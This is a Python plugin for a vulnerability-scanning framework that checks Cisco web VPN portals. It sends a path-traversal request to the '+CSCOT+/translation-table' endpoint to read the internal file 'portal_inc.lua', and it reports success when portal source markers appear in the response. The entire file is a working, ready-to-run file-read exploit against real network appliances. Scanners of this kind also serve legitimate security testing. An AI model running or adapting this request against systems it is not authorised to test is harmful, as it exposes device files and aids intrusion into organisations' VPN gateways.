#!/usr/bin/env python
# -*- encoding: utf-8 -*-


from lib.utils.cipher import base64encode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'cisco vpn download'
        self.keyword = ['cisco']
        self.info = 'cisco vpn download'
        self.type = VUL_TYPE.INFO
        self.level = VUL_LEVEL.MEDIUM
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            url = self.base_url + '+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
            async with ClientSession() as session:
                async with session.get(url=url) as response:
                    if response !=None:
                        text = await response.text()
                        if 'dofile' in text and 'cisco.com' in text:
                            self.flag = 1
                            self.res.append({"info": url, "key": 'cisco vpn download'})